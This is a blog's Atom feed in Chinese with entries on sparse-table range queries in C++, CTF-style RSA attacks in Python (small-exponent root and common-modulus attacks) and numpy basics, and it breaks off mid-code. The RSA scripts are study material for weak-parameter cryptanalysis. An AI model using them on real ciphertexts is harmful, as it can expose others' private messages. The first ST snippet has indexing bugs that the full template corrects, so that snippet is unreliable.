<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://zzuzyj.github.io/atom.xml" rel="self"/>
  
  <link href="http://zzuzyj.github.io/"/>
  <updated>2022-04-24T13:12:08.000Z</updated>
  <id>http://zzuzyj.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>st表模板</title>
    <link href="http://zzuzyj.github.io/2022/05/03/st%E8%A1%A8/"/>
    <id>http://zzuzyj.github.io/2022/05/03/st%E8%A1%A8/</id>
    <published>2022-05-03T09:23:29.918Z</published>
    <updated>2022-04-24T13:12:08.000Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#st表">st表</a><ul><li><a href="#介绍及其代码实现">介绍及其代码实现</a><ul><li><a href="#1-st表创建">1 st表创建</a></li><li><a href="#2-st表查询">2 st表查询</a></li></ul></li><li><a href="#模板题">模板题</a><ul><li><a href="#p3865-模板st-表">P3865 【模板】ST 表</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="st表">st表</span></h1><h2><span id="介绍及其代码实现">介绍及其代码实现</span></h2><p><strong>ST （Spares Table，稀疏表）</strong> 算法主要运用了倍增的思想，初始化在O(nlogn) 时间构造一个二维表，可以用仅仅O（1)的时间处理查询区间[L,R]的最值问题，大大节省了查询的时间.另外， 例如“区间按位和”、“区间按位或”、“区间 GCD”，ST 表都能高效地解决。 </p><script type="math/tex; mode=display">设F[i,j]表示[i,i+2^j-1]区间的最值，区间长度为2^j,我们可以将其分为长度为2^{j-1}的两个区间，\\然后求两个子区间的最值，递推可得公式\\f[i][j]=max(f[i][j-1],f[i+(1<<k-1)][k-1])\\</script><h3><span id="1-st表创建">1 st表创建</span></h3><script type="math/tex; mode=display">用f[i,j]表示区间[i,i+2^j-1]的最值，区间长度为2^j,若数组长度为n\\，那么区间最大长度为2^k<=n<=2^{k+1},k=\log_2{\lfloor n \rfloor},一般都不会太大建议看题目范围，一般20-25就够用</script><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre_ST</span><span class="params">()</span></span>&#123;</span><br><span class="line">   lg[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">       lg[n]=lg[n/<span class="number">2</span>]+<span class="number">1</span>;</span><br><span class="line">       f[i][<span class="number">0</span>]=a[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">20</span>;j++)&#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">           f[i][j]=<span class="built_in">max</span>(f[i][j<span class="number">-1</span>],f[i+(<span class="number">1</span>&lt;&lt;j<span class="number">-1</span>)][j<span class="number">-1</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;                              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-st表查询">2 st表查询</span></h3><script type="math/tex; mode=display">若查询区间[l,r],首先计算k的值，同上 2^k <= r-l+1 <= 2^{K+1},\\k=lg[r-l+1]=>\log_2{r-l+1},查询时取l向右2^K个数,\\r向前2^k个数，可以保证覆盖查询的整个区间，保证结果的正确性</script><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> k=lg[r-l+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(f[l][k],f[r<span class="number">-1</span>+(<span class="number">1</span>&lt;&lt;k)][k]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="模板题">模板题</span></h2><h3><span id="p3865-模板st-表">P3865 【模板】ST 表</span></h3><p>题目链接 ：<a href="https://www.luogu.com.cn/problem/P3865">https://www.luogu.com.cn/problem/P3865</a></p><p>纯正的模板题，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> f[N][<span class="number">30</span>],lg[N],a[N],n,m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre_ST</span><span class="params">()</span></span>&#123;</span><br><span class="line">   lg[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">       lg[i]=lg[i/<span class="number">2</span>]+<span class="number">1</span>;</span><br><span class="line">       f[i][<span class="number">0</span>]=a[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">20</span>;j++)&#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i<span class="number">-1</span>+(<span class="number">1</span>&lt;&lt;j)&lt;=n;i++)&#123;</span><br><span class="line">           f[i][j]=<span class="built_in">max</span>(f[i][j<span class="number">-1</span>],f[i+(<span class="number">1</span>&lt;&lt;j<span class="number">-1</span>)][j<span class="number">-1</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> k=lg[r-l+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(f[l][k],f[r+<span class="number">1</span>-(<span class="number">1</span>&lt;&lt;k)][k]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    <span class="built_in">pre_ST</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">query</span>(l,r));</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id>#</span></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#st表&quot;&gt;st表&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#介绍及其代码实现&quot;&gt;介绍及其代码实现&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-st表创建&quot;&gt;1 st表创建&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a hre</summary>
      
    
    
    
    <category term="algorithm" scheme="http://zzuzyj.github.io/categories/algorithm/"/>
    
    <category term="模板" scheme="http://zzuzyj.github.io/categories/algorithm/%E6%A8%A1%E6%9D%BF/"/>
    
    
    <category term="st表" scheme="http://zzuzyj.github.io/tags/st%E8%A1%A8/"/>
    
    <category term="倍增" scheme="http://zzuzyj.github.io/tags/%E5%80%8D%E5%A2%9E/"/>
    
  </entry>
  
  <entry>
    <title>RSA攻击</title>
    <link href="http://zzuzyj.github.io/2022/05/03/RSA/"/>
    <id>http://zzuzyj.github.io/2022/05/03/RSA/</id>
    <published>2022-05-03T09:23:29.913Z</published>
    <updated>2022-04-19T03:01:06.000Z</updated>
    
    <content type="html"><![CDATA[<hr><h2><span id="基础类型给定pqec">基础类型，给定p,q,e,c</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=invmod(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2><span id="可直接分解的npq">可直接分解的N（p,q）</span></h2><p>运用yafu分解</p><p>运用网站在线分解 <a href="http://www.factordb.com/">http://www.factordb.com</a> </p><h2><span id="小e攻击">小e攻击</span></h2><p>e非常小，可以直接开根拿到m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">n=</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m=c+n*k</span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line">    flag=iroot(m,e)</span><br><span class="line">    <span class="keyword">if</span>(flag[<span class="number">0</span>]):</span><br><span class="line">        <span class="built_in">print</span>(n2s(<span class="built_in">int</span>(flag[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure><h2><span id="共模攻击nm相同ce不同">共模攻击（n,m相同，c,e不同）</span></h2><p>n不变，可以根据e1,e2,c1,c2,n可以不求d1,d2直接求解m</p><p> e1,e2互素  gcd(e1,e2)=1</p><script type="math/tex; mode=display">则 e1*s1+e2*s2=1,s1,s2均为整数，s1,s2一正一负，通过gmpy2 的gcdext(e1,e2)可以计算出(s1,s2)\\又 c_1 \equiv m^{e_1} \bmod n,c_2\equiv m^{e_2}\bmod n.\\则(c_1^{s_1}c_2^{s_2})\bmod n = ((m^{e_1}\bmod n)^{s_1}(m^{e_2}\bmod n)^{s_2})\bmod n\\化简 (c_1^{s_1}c_2^{s_2})\bmod n = (m^{e_1s_1+e_2s_2})\bmod n\\又e1*s1+e2*s2=1\\则c_1^{s_1}*c_2^{s_2}=m</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deattack</span>(<span class="params">e1,e2,c1,c2,n</span>):</span><br><span class="line">    g,s1,s2=gcdext(e1,e2)</span><br><span class="line">    <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">        s1=-s1</span><br><span class="line">        c1=invert(c1,n)</span><br><span class="line">    <span class="keyword">if</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">        s2=-s2</span><br><span class="line">        c2=invert(c2,n)</span><br><span class="line">    m=<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n)%n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">n=</span><br><span class="line">flag=deattack(e1,e2,c1,c2,n)</span><br><span class="line"><span class="built_in">print</span>(n2s(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;基础类型给定pqec&quot;&gt;基础类型，给定p,q,e,c&lt;/span&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="Crypto" scheme="http://zzuzyj.github.io/categories/Crypto/"/>
    
    
    <category term="RSA" scheme="http://zzuzyj.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>numpylearn</title>
    <link href="http://zzuzyj.github.io/2022/05/03/numpylearn/"/>
    <id>http://zzuzyj.github.io/2022/05/03/numpylearn/</id>
    <published>2022-05-03T09:23:29.906Z</published>
    <updated>2022-04-28T12:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#numpy">numpy</a><ul><li><a href="#官方文档-httpsnumpyorgdocstablereference">官方文档 https://numpy.org/doc/stable/reference/</a></li><li><a href="#初识数组">初识数组</a><ul><li><a href="#初始数组">初始数组</a></li><li><a href="#认识类型">认识类型</a></li><li><a href="#查询属性">查询属性</a></li><li><a href="#初始赋值">初始赋值</a></li><li><a href="#类型转换">类型转换</a></li></ul></li><li><a href="#一维操作">一维操作</a><ul><li><a href="#索引切片">索引切片</a></li><li><a href="#元素运算">元素运算</a></li><li><a href="#矢量运算">矢量运算</a></li><li><a href="#搜索排序">搜索排序</a></li><li><a href="#数理统计">数理统计</a></li><li><a href="#读取保存">读取保存</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="numpy">numpy</span></h1><h2><span id="官方文档-httpsnumpyorgdocstablereference">官方文档 </span></h2><h2><span id="初识数组">初识数组</span></h2><h3><span id="初始数组">初始数组</span></h3><h4><span id="array">array()</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">ls=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">a=np.array(ls)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># [1 2 3 4 5 6 7 8]</span></span><br></pre></td></tr></table></figure><h3><span id="认识类型">认识类型</span></h3><h4><span id="dtype">dtype</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line">a =np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],dtype=np.<span class="built_in">bool</span>)</span><br><span class="line">b =np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],dtype=np.int8)</span><br><span class="line">c =np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],dtype=np.uint8)</span><br><span class="line">d =np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],dtype=np.float16)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a,a.dtype)</span><br><span class="line"><span class="built_in">print</span>(b,b.dtype)</span><br><span class="line"><span class="built_in">print</span>(c,c.dtype)</span><br><span class="line"><span class="built_in">print</span>(d,d.dtype) </span><br><span class="line"><span class="comment">#[False  True  True  True  True  True  True  True  True  True] bool</span></span><br><span class="line"><span class="comment">#[0 1 2 3 4 5 6 7 8 9] int8</span></span><br><span class="line"><span class="comment">#[0 1 2 3 4 5 6 7 8 9] uint8</span></span><br><span class="line"><span class="comment">#[0. 1. 2. 3. 4. 5. 6. 7. 8. 9.] float16</span></span><br></pre></td></tr></table></figure><h3><span id="查询属性">查询属性</span></h3><div class="table-container"><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.dtype</td><td>数组元素的数据类型</td></tr><tr><td>.ndim</td><td>数组的维度的个数</td></tr><tr><td>.shape</td><td>数组的形状</td></tr><tr><td>.size</td><td>数组元素的总数</td></tr><tr><td>.itemsize</td><td>数组中的每个元素的字节大小</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([</span><br><span class="line">    [<span class="number">4.8</span>, <span class="number">6</span>], [<span class="number">4.38</span>, <span class="number">5.5</span>], [<span class="number">4.45</span>, <span class="number">6</span>], [<span class="number">9.5</span>, <span class="number">12.8</span>],</span><br><span class="line">    [<span class="number">3.5</span>, <span class="number">5.5</span>], [<span class="number">3.5</span>, <span class="number">5.5</span>], [<span class="number">9.5</span>, <span class="number">12.8</span>], [<span class="number">1.875</span>, <span class="number">2.3</span>],</span><br><span class="line">    [<span class="number">1.875</span>, <span class="number">2.3</span>], [<span class="number">1.875</span>, <span class="number">2.3</span>], [<span class="number">4.38</span>, <span class="number">5.5</span>], [<span class="number">4.4</span>, <span class="number">5.5</span>],</span><br><span class="line">    [<span class="number">4.4</span>, <span class="number">5.5</span>], [<span class="number">4.4</span>, <span class="number">5.5</span>], [<span class="number">4.45</span>, <span class="number">6</span>], [<span class="number">4.45</span>, <span class="number">6</span>], [<span class="number">4.45</span>, <span class="number">6</span>], ])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;类型：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a.dtype))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;维度：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a.ndim))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;形状：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a.shape))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元素总数：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a.size))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;元素字节大小：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a.itemsize))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数组所占内存空间：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a.size*a.itemsize))</span><br><span class="line"><span class="comment"># 类型：float64</span></span><br><span class="line"><span class="comment"># 维度：2</span></span><br><span class="line"><span class="comment"># 形状：(17, 2)</span></span><br><span class="line"><span class="comment"># 元素总数：34</span></span><br><span class="line"><span class="comment"># 元素字节大小：8</span></span><br><span class="line"><span class="comment"># 数组所占内存空间：272</span></span><br></pre></td></tr></table></figure><h3><span id="初始赋值">初始赋值</span></h3><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>np.arange()</td><td>类似range()函数</td></tr><tr><td>np.ones(shape)</td><td>根据shape生成一个全一的数组，shape是一个元组</td></tr><tr><td>np.zeros(shape)</td><td>根据shape生成一个全0数组，shape是一个元组</td></tr><tr><td>np.linspace()</td><td>根据气质数据等间距地填充数据，形成数组</td></tr><tr><td>np.concatetenate()</td><td>将两个或多个数组合并成一个新的数组</td></tr><tr><td>np.full(shape,val)</td><td>根据shape生成一个全为val的数组</td></tr><tr><td>np.eye(n)</td><td>创建一个n*n的矩阵，对角线为1,其余为0</td></tr><tr><td>np.ones_like(a)</td><td>根据a的形状生成一个全为1的数组</td></tr><tr><td>np.zeros_like(a)</td><td>根据a的形状生成一个全为0的数组</td></tr><tr><td>np.full_like(a,val)</td><td>根据a的形状生成一个全为val的数组</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.arange(<span class="number">0.1</span>, <span class="number">2.0</span>, <span class="number">0.1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.ones(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.ones((<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.zeros(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.linspace(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.linspace(<span class="number">1</span>, <span class="number">2</span>, endpoint=<span class="literal">False</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.linspace(<span class="number">1</span>, <span class="number">2</span>, num=<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">x1 = np.linspace(<span class="number">0</span>, <span class="number">1</span>, num=<span class="number">10</span>)</span><br><span class="line">x2 = np.linspace(<span class="number">1</span>, <span class="number">2</span>, num=<span class="number">10</span>)</span><br><span class="line">y = np.zeros(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">plt.plot(x1, y, <span class="string">&quot;o&quot;</span>)</span><br><span class="line">plt.plot(x2, y, <span class="string">&quot;o&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/numpylearn/1650545098976.png" alt="1650545098976"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">b = np.arange(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.concatenate((a, b)))</span><br><span class="line"></span><br><span class="line">data = np.random.normal(<span class="number">2</span>, <span class="number">0.1</span>, <span class="number">100000</span>)</span><br><span class="line">plt.hist(data, <span class="number">1000</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/numpylearn/1650545211924.png" alt="1650545211924"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = np.random.beta(<span class="number">2</span>, <span class="number">2</span>, <span class="number">100000</span>)</span><br><span class="line">plt.hist(data, <span class="number">1000</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/numpylearn/1650545355513.png" alt="1650545355513"></p><p>等等……</p><h3><span id="类型转换">类型转换</span></h3><div class="table-container"><table><thead><tr><th>函数</th><th>属性</th></tr></thead><tbody><tr><td>.astype(new_type)</td><td>强制转换数组的数据类型</td></tr><tr><td>.tolist()</td><td>返回数组数据的副本作为（嵌套的）python列表</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">1</span>, <span class="number">5</span>, <span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a.dtype)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a.astype(np.int32))</span><br><span class="line"><span class="built_in">print</span>(<span 